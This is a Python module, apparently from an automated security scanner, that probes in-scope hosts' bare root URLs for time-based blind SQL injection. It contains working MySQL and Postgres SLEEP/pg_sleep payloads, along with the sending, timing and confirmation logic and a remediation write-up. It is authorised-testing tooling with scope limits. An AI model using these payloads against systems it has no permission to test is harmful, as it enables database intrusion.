"""Active baseline probes — deterministic active checks, $0 LLM cost.

These probes complement the passive recon pass and the LLM-driven OWASP
phases by running a small, fixed set of *active* attacks whose signature
is purely structural (not requiring LLM creativity to generate).

Why this exists
---------------
Bug bounty researchers report a steady drumbeat of vulnerabilities whose
exploitation pattern is deterministic but whose *injection point* falls
outside the LLM's natural attack reasoning. Two examples:

1. **Bare-root quote-escape SQLi** (Avira, May-2026 report). Vulnerability
   is in the URL query string of the bare root path with no named
   parameter:

   .. code-block:: text

       GET /?"+IF(LENGTH(DATABASE())=8,SLEEP(5),NULL)+"&x=1

   Backend concatenates the raw query string into a SQL literal. The
   LLM-driven SQLi phase looks for ``?id=`` / ``?search=`` style named
   parameters and never tries the bare-root pattern. This module runs
   that probe deterministically for every in-scope host.

2. (future) Bare-root XXE / SSRF / HTTP-smuggling probes follow the same
   pattern and can plug into the same scaffold.

Cost / safety
-------------
- Probes are time-based blind: send 1 control + 4 short payloads per
  host, time the responses, flag any payload whose elapsed time is
  ``>= control + 3.0s`` AND ``>= 4.0s`` absolute. Threshold tuned to
  ride out network jitter while still catching ``SLEEP(5)``.
- A single re-test confirms a hit before reporting (rules out a transient
  network slowdown).
- Per-host budget: ~5–6 requests, ~20 seconds in the worst case (one
  full SLEEP(5) hit). For a 10-host scope: ~60 requests, ~3 minutes.
- Probes ONLY hit hosts that are already in the scanner's allow-list —
  this module never expands scope.
- Skipped entirely when ``scan_profile == "crawl_only"`` (fuzz traffic
  is forbidden in crawl-only).

This module is intentionally orthogonal to ``passive_recon.py``:
- passive_recon = no payloads, no fuzz, no SLEEP probes
- active_baseline = a tightly scoped set of deterministic active probes
  that the LLM phase would not reliably generate on its own
"""
from __future__ import annotations

import asyncio
import logging
import time
from typing import Iterable
from urllib.parse import urlparse

logger = logging.getLogger(__name__)

# ── Bare-root SQLi probe payloads ──────────────────────────────────────
# Each tuple: (label, raw_query_string). The query string is appended to
# the host root as ``GET /?<query>&_ab=1``. The trailing ``_ab=1`` keeps
# the payload as the FIRST query token (so a backend that concatenates
# only the raw query gets the injection at the start of its SQL literal)
# and gives a reliable cache-buster on each retry.
#
# All payloads expect MySQL-flavour ``SLEEP(5)``. Postgres / MSSQL
# variants are tested too so the probe can fire across DB vendors.
_SLEEP_SECONDS = 5
_BARE_ROOT_PAYLOADS: list[tuple[str, str]] = [
    # Avira-style: double-quote escape, MySQL conditional
    ("mysql_dquote_if",
     '"+IF(LENGTH(DATABASE())%3E0,SLEEP(5),NULL)+"'),
    # Single-quote variant (more common but still rare on bare-root)
    ("mysql_squote_if",
     "%27+IF(LENGTH(DATABASE())%3E0,SLEEP(5),NULL)+%27"),
    # Classic OR-SLEEP — works when the raw query is concatenated into a
    # WHERE clause without any quote wrapping at all
    ("mysql_bool_or_sleep",
     "%27+OR+SLEEP(5)--+-"),
    # Postgres pg_sleep variant
    ("postgres_pg_sleep",
     "%27%3BSELECT+pg_sleep(5)--+-"),
]

# Threshold tuning. Time-based blind SQLi requires the SLEEP to fire AND
# the network jitter to stay below the gap. With SLEEP(5):
#   control ~= 0.5s, attack ~= 5.5s -> delta ~= 5.0s. Comfortable.
# With slow targets (TLS handshake on first hit, geo-distant CDN):
#   control ~= 2.0s, attack ~= 7.0s -> delta ~= 5.0s. Still fine.
# A 3.0s minimum delta plus a 4.0s absolute floor rules out:
#   - a re-handshake making one request 2s slower (delta 2s, no fire)
#   - a slow-but-uniform endpoint (control 4s, attack 4.2s, no fire)
_DELTA_THRESHOLD_S = 3.0
_ABSOLUTE_THRESHOLD_S = 4.0
_REQUEST_TIMEOUT_S = 15.0   # > SLEEP_SECONDS + 5s tolerance
_PER_HOST_CAP_S = 60.0      # circuit-breaker: stop probing a host that's slow


async def _timed_get(http_client, url: str) -> tuple[float, int | None]:
    """Send a single GET and return (elapsed_seconds, status_code).

    Returns ``(_REQUEST_TIMEOUT_S + 1.0, None)`` on timeout or transport
    error so the caller treats it as "took too long" without raising.
    """
    started = time.perf_counter()
    try:
        resp = await http_client.get(url, timeout=_REQUEST_TIMEOUT_S)
        elapsed = time.perf_counter() - started
        return elapsed, resp.status_code
    except Exception as exc:  # network, timeout, TLS, anything
        elapsed = time.perf_counter() - started
        logger.debug("bare-root probe transport error on %s: %s", url, exc)
        # Cap elapsed so we don't accidentally flag a 30s timeout as a
        # SQLi hit — return the failure threshold + 1 as a sentinel.
        return _REQUEST_TIMEOUT_S + 1.0, None


def _build_finding(
    *, host: str, payload_label: str, raw_query: str,
    control_elapsed: float, attack_elapsed: float,
    confirmed: bool,
) -> dict:
    """Render a structured AI-Raw finding dict for a confirmed hit."""
    full_url = f"https://{host}/?{raw_query}&_ab=1"
    decoded = (
        raw_query
        .replace("%27", "'")
        .replace("%3B", ";")
        .replace("%3E", ">")
        .replace("+", " ")
    )
    severity = "Critical"
    confidence = "High" if confirmed else "Medium"
    return {
        "title": "Blind Time-Based SQL Injection in Bare Query String",
        "severity": severity,
        "confidence": confidence,
        "owasp_category": "A03:2021",
        "cwe": "CWE-89",
        "url": full_url,
        "parameter": "(raw query string)",
        "payload": decoded,
        "evidence": (
            f"Control GET https://{host}/?_ab=1 returned in "
            f"{control_elapsed:.2f}s. "
            f"Attack GET https://{host}/?{decoded}&_ab=1 returned in "
            f"{attack_elapsed:.2f}s "
            f"(delta {attack_elapsed - control_elapsed:.2f}s). "
            f"SLEEP({_SLEEP_SECONDS}) was triggered, indicating the raw "
            f"query string is concatenated into a SQL literal on the "
            f"server. Confirmed={confirmed}."
        ),
        "remediation": (
            "Do not concatenate the raw query string into SQL. Use "
            "parameterized queries / prepared statements. If the backend "
            "must accept a raw query string, validate against an "
            "allow-list and strip SQL metacharacters before "
            "interpolation."
        ),
        "phase": "Active Baseline (Bare-Root SQLi)",
        "tool": "active_baseline.bare_root_sqli_probe",
        "_finding_source": "active_baseline",
        "_payload_label": payload_label,
    }


def _normalize_hosts(hosts: Iterable[str]) -> list[str]:
    """Take any mix of URLs / hostnames and return a deduped, sorted
    list of bare hostnames (no scheme, no path, no query)."""
    seen: set[str] = set()
    result: list[str] = []
    for h in hosts or []:
        if not h:
            continue
        h = str(h).strip()
        if not h:
            continue
        if "://" in h:
            parsed = urlparse(h)
            host = (parsed.hostname or "").strip().lower()
        else:
            host = h.split("/", 1)[0].split(":", 1)[0].strip().lower()
        if not host or host in seen:
            continue
        seen.add(host)
        result.append(host)
    result.sort()
    return result


async def run_bare_root_sqli_probe(
    http_client,
    hosts: Iterable[str],
    *,
    on_finding: callable | None = None,
    on_progress: callable | None = None,
    cancel_flag=None,
) -> list[dict]:
    """Probe every host's bare root URL for time-based blind SQLi.

    For each host:
      1. Send control ``GET https://<host>/?_ab=1`` and record elapsed.
      2. For each payload, send ``GET https://<host>/?<payload>&_ab=1``
         and record elapsed.
      3. If any attack >= control + 3.0s AND >= 4.0s absolute, send the
         attack a second time to rule out network jitter.
      4. If the second attempt also >= control + 3.0s, emit a Critical
         SQLi finding.

    Args:
        http_client: an httpx.AsyncClient (or compatible) already
            configured with the scanner's user agent / cookies / TLS
            settings.
        hosts: iterable of hostnames or URLs in scope. Anything outside
            this list is left alone — we never expand scope.
        on_finding: optional callback invoked with each finding dict.
        on_progress: optional callback ``(event_name, data_dict)`` for
            live progress reporting (mirrors passive_recon's pattern).
        cancel_flag: optional ``threading.Event`` — checked between hosts
            so a user-initiated stop drops out cleanly without finishing
            the remaining probes.

    Returns:
        list[dict] of finding dicts. Empty list if nothing fires.
    """
    findings: list[dict] = []
    _emit = on_finding or (lambda f: None)
    _progress = on_progress or (lambda event, data: None)

    targets = _normalize_hosts(hosts)
    if not targets:
        _progress("active_baseline_skip",
                  {"reason": "no in-scope hosts to probe"})
        return findings

    _progress("active_baseline_start", {
        "probe": "bare_root_sqli",
        "hosts": len(targets),
        "payloads_per_host": len(_BARE_ROOT_PAYLOADS),
        "sleep_seconds": _SLEEP_SECONDS,
    })

    seen_keys: set[tuple[str, str]] = set()

    for host in targets:
        if cancel_flag is not None and getattr(cancel_flag, "is_set", lambda: False)():
            _progress("active_baseline_cancel", {"host": host})
            break

        host_started = time.perf_counter()

        control_url = f"https://{host}/?_ab=1"
        control_elapsed, control_status = await _timed_get(http_client, control_url)
        if control_status is None:
            _progress("active_baseline_step", {
                "host": host, "step": "control_failed",
                "elapsed_s": round(control_elapsed, 3),
            })
            continue

        for label, payload in _BARE_ROOT_PAYLOADS:
            if cancel_flag is not None and getattr(cancel_flag, "is_set", lambda: False)():
                break
            if (time.perf_counter() - host_started) > _PER_HOST_CAP_S:
                _progress("active_baseline_step", {
                    "host": host, "step": "host_budget_exceeded",
                })
                break
            attack_url = f"https://{host}/?{payload}&_ab=1"
            attack_elapsed, attack_status = await _timed_get(http_client, attack_url)
            if attack_status is None:
                # Transport / TLS / DNS error - NOT a SQLi signal even if
                # the timer ran long. Skip this payload silently.
                _progress("active_baseline_step", {
                    "host": host, "step": "probe_failed", "label": label,
                    "elapsed_s": round(attack_elapsed, 3),
                })
                continue
            delta = attack_elapsed - control_elapsed
            _progress("active_baseline_step", {
                "host": host, "step": "probe", "label": label,
                "control_s": round(control_elapsed, 3),
                "attack_s": round(attack_elapsed, 3),
                "delta_s": round(delta, 3),
            })

            if delta < _DELTA_THRESHOLD_S or attack_elapsed < _ABSOLUTE_THRESHOLD_S:
                continue

            await asyncio.sleep(0.5)
            confirm_elapsed, confirm_status = await _timed_get(http_client, attack_url)
            if confirm_status is None:
                # Confirmation transport failure - refuse to claim a hit
                # without a clean second measurement.
                _progress("active_baseline_step", {
                    "host": host, "step": "confirm_failed", "label": label,
                    "elapsed_s": round(confirm_elapsed, 3),
                })
                continue
            confirm_delta = confirm_elapsed - control_elapsed
            confirmed = (
                confirm_delta >= _DELTA_THRESHOLD_S
                and confirm_elapsed >= _ABSOLUTE_THRESHOLD_S
            )
            _progress("active_baseline_step", {
                "host": host, "step": "confirm", "label": label,
                "confirm_s": round(confirm_elapsed, 3),
                "confirm_delta_s": round(confirm_delta, 3),
                "confirmed": confirmed,
            })
            if not confirmed:
                continue

            key = (host, label)
            if key in seen_keys:
                continue
            seen_keys.add(key)

            f = _build_finding(
                host=host, payload_label=label, raw_query=payload,
                control_elapsed=control_elapsed,
                attack_elapsed=attack_elapsed,
                confirmed=True,
            )
            findings.append(f)
            _emit(f)

    _progress("active_baseline_end", {
        "probe": "bare_root_sqli",
        "hosts": len(targets),
        "findings": len(findings),
    })
    return findings


__all__ = ["run_bare_root_sqli_probe"]
